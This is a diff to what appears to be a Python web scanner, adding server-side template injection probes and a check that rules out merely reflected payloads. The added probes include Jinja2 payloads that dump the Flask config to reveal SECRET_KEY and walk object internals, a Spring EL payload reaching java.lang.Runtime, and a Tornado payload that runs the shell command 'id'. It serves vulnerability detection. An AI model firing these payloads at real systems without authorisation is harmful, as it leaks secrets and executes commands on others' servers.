@@ -19,11 +19,21 @@
 
   # Use large unique numbers that CANNOT appear naturally in HTML
   SSTI_PROBES = [
+      # Basic arithmetic probes (large unique numbers)
       {'payload': '{{91371*97331}}',   'expect': '8893559001',  'engine': 'Jinja2/Twig'},
       {'payload': '${91371*97331}',    'expect': '8893559001',  'engine': 'FreeMarker/Mako'},
       {'payload': '#{91371*97331}',    'expect': '8893559001',  'engine': 'Ruby ERB/Java EL'},
       {'payload': '<%= 91371*97331 %>', 'expect': '8893559001', 'engine': 'ERB/EJS'},
+      # Jinja2-specific (Flask render_template_string) — CRITICAL for Flask apps
+      {'payload': '{{config}}',        'expect': 'SECRET_KEY',  'engine': 'Jinja2-config'},
+      {'payload': '{{config.items()}}', 'expect': 'SECRET_KEY', 'engine': 'Jinja2-config'},
+      {'payload': '{{self.__class__}}', 'expect': 'TemplateReference', 'engine': 'Jinja2-class'},
+      {'payload': '{{7*7}}',           'expect': '49',          'engine': 'Jinja2-simple'},
+      {'payload': "{{''.__class__.__mro__}}", 'expect': 'str', 'engine': 'Jinja2-mro'},
+      # Spring EL
       {'payload': '${T(java.lang.Runtime).getRuntime()}', 'expect': 'java.lang.Runtime', 'engine': 'Spring EL'},
+      # Tornado
+      {'payload': '{% import os %}{{os.popen("id").read()}}', 'expect': 'uid=', 'engine': 'Tornado'},
   ]
 
   AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
@@ -58,7 +68,15 @@
           except Exception:
               continue
           # CRITICAL CHECK: result must appear in response BUT NOT in baseline
+          # For short expect values (like '49'), also check that our PAYLOAD is NOT in the response
+          # (if payload is reflected literally as text, template was NOT evaluated)
           if probe['expect'] in r.text and probe['expect'] not in baseline:
+              # Extra check: make sure the raw payload isn't just reflected back
+              if probe['payload'] in r.text:
+                  # Payload reflected literally — check if expect value also appears OUTSIDE the payload
+                  stripped = r.text.replace(probe['payload'], '')
+                  if probe['expect'] not in stripped:
+                      continue  # false positive — payload reflected, not evaluated
               print(f"[CRITICAL] SSTI CONFIRMED: {url} param={param}")
               print(f"  Engine: {probe['engine']}  Payload: {probe['payload']}")
               print(f"  Response contains '{probe['expect']}' (evaluated — NOT in baseline)")
